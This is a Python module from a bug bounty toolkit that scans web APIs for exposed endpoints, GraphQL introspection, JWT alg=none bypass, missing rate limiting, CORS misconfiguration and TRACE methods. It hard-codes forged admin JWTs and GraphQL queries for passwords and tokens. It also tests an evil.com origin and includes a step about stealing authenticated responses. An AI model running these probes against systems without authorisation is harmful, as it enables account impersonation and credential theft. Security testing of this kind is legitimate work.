# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""API Testing — discovery, GraphQL, JWT, rate-limit, CORS, method abuse."""

import urllib.parse
import urllib.request
import json
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
    "/swagger", "/swagger-ui", "/swagger-ui.html", "/swagger-ui/",
    "/api-docs", "/openapi.json", "/openapi.yaml", "/openapi.yml",
    "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/api/swagger.json", "/swagger/v1/swagger.json",
    "/graphql", "/graphiql", "/playground", "/graphql/playground",
    "/api/graphql", "/api/graphiql",
    "/api/health", "/api/healthz", "/api/status", "/api/ping",
    "/api/version", "/api/info", "/api/debug",
    "/.well-known/openapi.json",
    "/redoc", "/api/redoc",
    "/api/schema", "/schema.json", "/schema.graphql",
    "/api/endpoints", "/api/routes", "/api/methods",
    "/api/me", "/api/user", "/api/users", "/api/accounts",
    "/api/admin", "/api/internal", "/api/private",
]

GQL_INTROSPECTION = '{"query":"{__schema{types{name fields{name type{name kind}}}}}"}'
GQL_DEBUG_QUERIES = [
    '{"query":"{ users { id email password } }"}',
    '{"query":"{ admin { id email token } }"}',
    '{"query":"{ __type(name: \\"User\\") { fields { name } } }"}',
]

JWT_NONE_TOKENS = [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
    "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
    "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
]

JWT_WEAK_SECRET_TOKENS = [
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
]

RATE_LIMIT_PATHS = ["/api/login", "/api/auth", "/api/signin", "/login", "/api/v1/login"]
DANGEROUS_METHODS = ["TRACE", "TRACK", "DEBUG", "CONNECT"]

CVSS_CRITICAL = "9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
CVSS_HIGH     = "8.1 (High)     — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS_MEDIUM   = "5.3 (Medium)   — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"


def _discover(base_url: str, timeout: int) -> dict:
    found, spec = [], None
    def _probe(path):
        url = base_url.rstrip("/") + path
        resp = fetch_url(url, timeout=timeout)
        if resp and resp.get("status") == 200:
            body = resp.get("body") or ""
            is_spec = any(k in body for k in ['"swagger"', '"openapi"', '"paths"', '"__schema"'])
            return (url, is_spec)
        return None
    with ThreadPoolExecutor(max_workers=20) as ex:
        for r in ex.map(_probe, API_PATHS):
            if r:
                found.append(r[0])
                if r[1] and not spec:
                    spec = r[0]
    return {"endpoints": found, "spec": spec}


def _check_graphql(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for path in ["/graphql", "/graphiql", "/api/graphql", "/playground"]:
        url = base_url.rstrip("/") + path
        try:
            req = urllib.request.Request(url, data=GQL_INTROSPECTION.encode(), method="POST")
            req.add_header("Content-Type", "application/json")
            req.add_header("User-Agent", "BugBountyTool/1.0")
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read(5000).decode("utf-8", errors="replace")
                if r.status == 200 and "__schema" in body:
                    types = len(re.findall(r'"name"\s*:\s*"\w+"', body))
                    findings.append({
                        "type": "API — GraphQL Introspection Enabled",
                        "severity": "MEDIUM",
                        "url": url,
                        "cvss": CVSS_MEDIUM,
                        "description": f"GraphQL introspection enabled — full schema exposed ({types} types found).",
                        "steps_to_reproduce": (
                            f"1. POST {url} with body: {GQL_INTROSPECTION}\n"
                            "2. Response contains complete schema including all types, fields, queries, mutations."
                        ),
                        "impact": "Attacker maps the entire API surface — field names, relationships, auth bypass vectors.",
                        "recommendation": "Disable introspection in production. Use query depth/complexity limits. Implement field-level authorization.",
                    })
                    for q in GQL_DEBUG_QUERIES:
                        req2 = urllib.request.Request(url, data=q.encode(), method="POST")
                        req2.add_header("Content-Type", "application/json")
                        req2.add_header("User-Agent", "BugBountyTool/1.0")
                        try:
                            with urllib.request.urlopen(req2, timeout=timeout) as r2:
                                b2 = r2.read(2000).decode("utf-8", errors="replace")
                                if r2.status == 200 and any(f in b2.lower() for f in ["email", "password", "token"]):
                                    findings.append({
                                        "type": "API — GraphQL Sensitive Data Exposure",
                                        "severity": "CRITICAL",
                                        "url": url,
                                        "cvss": CVSS_CRITICAL,
                                        "payload": q,
                                        "description": "GraphQL query returns sensitive fields (email/password/token) without authorization.",
                                        "steps_to_reproduce": f"1. POST {url} with query: {q}\n2. Observe sensitive data in response.",
                                        "impact": "Full user data exfiltration including credentials.",
                                        "recommendation": "Implement field-level authorization. Never return password hashes or raw tokens.",
                                    })
                        except Exception:
                            pass
                    return findings
        except Exception:
            pass
    return findings


def _check_jwt(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for path in ["/api/me", "/api/user", "/api/profile", "/api/account", "/api/v1/me"]:
        url = base_url.rstrip("/") + path
        for token in JWT_NONE_TOKENS:
            try:
                req = urllib.request.Request(url)
                req.add_header("Authorization", f"Bearer {token}")
                req.add_header("User-Agent", "BugBountyTool/1.0")
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    body = r.read(1000).decode("utf-8", errors="replace")
                    if r.status == 200 and any(w in body.lower() for w in ["email", "user", "id", "name"]):
                        findings.append({
                            "type": "API — JWT None Algorithm Bypass",
                            "severity": "CRITICAL",
                            "url": url,
                            "cvss": CVSS_CRITICAL,
                            "token_used": token[:40] + "...",
                            "description": "JWT with alg=none accepted — authentication completely bypassed.",
                            "steps_to_reproduce": (
                                f"1. curl -H 'Authorization: Bearer {token[:40]}...' {url}\n"
                                "2. Observe 200 response with user data — no valid signature required."
                            ),
                            "impact": "Complete authentication bypass. Attacker can impersonate any user including admins.",
                            "recommendation": "Reject JWTs with alg=none. Enforce RS256 or HS256. Use a battle-tested JWT library. Pin the algorithm server-side.",
                        })
                        return findings
            except Exception:
                pass
    return findings


def _check_rate_limit(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for path in RATE_LIMIT_PATHS:
        url = base_url.rstrip("/") + path
        probe = fetch_url(url, timeout=timeout)
        if not probe or probe.get("status") not in (200, 400, 401, 422, 405):
            continue
        success, blocked = 0, False
        payload = json.dumps({"username": "test@test.com", "password": "wrong"}).encode()
        for i in range(20):
            try:
                req = urllib.request.Request(url, data=payload, method="POST")
                req.add_header("Content-Type", "application/json")
                req.add_header("User-Agent", f"BugBountyTool/1.0 ({i})")
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    if r.status == 429:
                        blocked = True
                        break
                    if r.status in (200, 400, 401, 422):
                        success += 1
            except Exception:
                pass
        if not blocked and success >= 15:
            findings.append({
                "type": "API — Missing Rate Limiting",
                "severity": "HIGH",
                "url": url,
                "cvss": CVSS_HIGH,
                "requests_sent": success,
                "description": f"Login endpoint {path} accepted {success}/20 requests without rate limiting or lockout.",
                "steps_to_reproduce": (
                    f"1. Send 20 rapid POST requests to {url}\n"
                    "2. None returned 429 Too Many Requests.\n"
                    "3. Brute-force attack is viable."
                ),
                "impact": "Credential stuffing and brute-force attacks against user accounts.",
                "recommendation": "Implement rate limiting (5 req/min per IP). Add exponential backoff. Use CAPTCHA after 3 failures. Consider account lockout.",
            })
            break
    return findings


def _check_cors(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for path in ["/api", "/api/v1", "/api/me", "/api/user", "/api/data"]:
        url = base_url.rstrip("/") + path
        for origin in ["https://evil.com", "null", f"https://evil.{urllib.parse.urlparse(base_url).netloc}"]:
            try:
                req = urllib.request.Request(url)
                req.add_header("Origin", origin)
                req.add_header("User-Agent", "BugBountyTool/1.0")
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    hdrs = dict(r.getheaders())
                    acao = hdrs.get("Access-Control-Allow-Origin", "") or hdrs.get("access-control-allow-origin", "")
                    acac = hdrs.get("Access-Control-Allow-Credentials", "") or hdrs.get("access-control-allow-credentials", "")
                    if (acao == origin or acao == "*") and acac.lower() == "true":
                        findings.append({
                            "type": "API — CORS Misconfiguration",
                            "severity": "HIGH",
                            "url": url,
                            "origin_tested": origin,
                            "acao_header": acao,
                            "acac_header": acac,
                            "cvss": CVSS_HIGH,
                            "description": f"API reflects arbitrary Origin '{origin}' with ACAC: true — CORS bypass possible.",
                            "steps_to_reproduce": (
                                f"1. curl -s -H 'Origin: {origin}' {url}\n"
                                f"2. Response: Access-Control-Allow-Origin: {acao}\n"
                                f"3. Response: Access-Control-Allow-Credentials: true\n"
                                "4. Exploit: host evil.js on evil.com to steal authenticated API responses."
                            ),
                            "impact": "Cross-origin data theft from authenticated users. Session token and data exfiltration.",
                            "recommendation": "Maintain an explicit origin allowlist. Never combine wildcard ACAO with ACAC: true. Validate Origin server-side.",
                        })
                        break
            except Exception:
                pass
    return findings


def _check_dangerous_methods(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for method in DANGEROUS_METHODS:
        try:
            req = urllib.request.Request(base_url, method=method)
            req.add_header("User-Agent", "BugBountyTool/1.0")
            with urllib.request.urlopen(req, timeout=timeout) as r:
                if r.status == 200 and method in ("TRACE", "TRACK"):
                    body = r.read(500).decode("utf-8", errors="replace")
                    if method.lower() in body.lower() or "trace" in body.lower():
                        findings.append({
                            "type": f"API — {method} Method Enabled (XST)",
                            "severity": "MEDIUM",
                            "url": base_url,
                            "cvss": CVSS_MEDIUM,
                            "description": f"HTTP {method} method is enabled — Cross-Site Tracing (XST) possible.",
                            "steps_to_reproduce": f"1. curl -X {method} {base_url}\n2. Observe request echoed back in response.",
                            "impact": "XST can expose HttpOnly cookies and Authorization headers via JavaScript in some configurations.",
                            "recommendation": f"Disable HTTP {method} in server config: 'TraceEnable Off' (Apache) or 'deny_methods {method}' (nginx).",
                        })
        except Exception:
            pass
    return findings


def run(base_url: str, domain: str = "", timeout: int = 5, threads: int = 10, **kwargs) -> dict:
    findings: list[dict] = []
    discovery = _discover(base_url, timeout)

    with ThreadPoolExecutor(max_workers=5) as ex:
        futures = [
            ex.submit(_check_graphql,          base_url, timeout),
            ex.submit(_check_jwt,              base_url, timeout),
            ex.submit(_check_rate_limit,       base_url, timeout),
            ex.submit(_check_cors,             base_url, timeout),
            ex.submit(_check_dangerous_methods, base_url, timeout),
        ]
        for fut in as_completed(futures):
            findings.extend(fut.result())

    return {
        "findings": findings,
        "api_endpoints_discovered": discovery["endpoints"],
        "spec_url": discovery.get("spec"),
        "summary": {
            "endpoints_discovered": len(discovery["endpoints"]),
            "checks": ["graphql-introspection", "jwt-none-alg", "rate-limiting", "cors", "dangerous-methods"],
            "total_findings": len(findings),
        },
    }


if __name__ == "__main__":
    pass
